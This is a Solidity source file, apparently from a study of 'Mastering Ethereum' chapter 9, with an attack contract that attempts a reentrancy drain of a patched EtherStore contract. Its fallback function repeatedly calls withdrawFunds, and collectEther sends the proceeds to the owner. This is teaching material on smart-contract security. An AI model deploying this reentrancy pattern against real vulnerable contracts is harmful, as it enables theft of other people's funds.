// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {EtherStoreFixed as UntrustedEtherStore} from "./EtherStoreFixed.sol";
import {Owned as TrustedOwned} from "./Owned.sol";

/**
 * @title Mastering Ethereum Chapter 9, Attack contract.
 * @author Victor Navascues.
 * @notice Attempts to explout EtherStoreFixed contract.
 * @dev This contract has been modified regarding the original one, by adding
 * and access modified in the `collectEther()` function (inheriting `Owned`).
 * This contract differs from the book implementation in:
 *  - It implements the mutex logic follwing the Solidity official
 *  documentation example (via modifier, below):
 *    - https://solidity.readthedocs.io/en/v0.6.0/contracts.html?highlight=constructor#function-modifiers
 *
 *  - It implements some Consensys' best practices (link below):
 *    - https://consensys.github.io/smart-contract-best-practices/recommendations
 *
 *    - Contract layout (type declarations, state variables, events, and
 *    functions).
 *    - Mark untrusted contracts. NA.
 *    - Function arguments with leading underscore.
 *    - Log names starting with `Log`.
 *    - Don't use `transfer()` or `send()`.
 *    - Handle errors in external calls.
 *    - Use modifiers only for checks.
 *    - Improved `fallback()` (e.g. simple, log an event, and check data
 *    length). NA.
 *    - Use events to monitor contract activity.
 *    - Lock pragmas to specific compiler version. NA.
 *
 *  - Added the optional message in `require()`.
 */
contract AttackFixed is TrustedOwned {
    UntrustedEtherStore public untrustedEtherStore;

    event LogFallbackCall(address _sender, uint256 _value);

    constructor(address _untrustedEtherStoreAddress) public {
        untrustedEtherStore = UntrustedEtherStore(_untrustedEtherStoreAddress);
    }

    receive() external payable {}

    function attackUntrustedEtherStore() external payable {
        require(msg.value >= 1 ether);
        untrustedEtherStore.depositFunds{value: 1 ether}();
        untrustedEtherStore.withdrawFunds(1 ether);
    }

    function collectEther() public onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transaction failed.");
    }

    fallback() external payable {
        // Log `fallback()` calls for checking successful reentrancy attacks.
        emit LogFallbackCall(msg.sender, msg.value);

        if (address(untrustedEtherStore).balance > 1 ether) {
            untrustedEtherStore.withdrawFunds(1 ether);
        }
    }
}
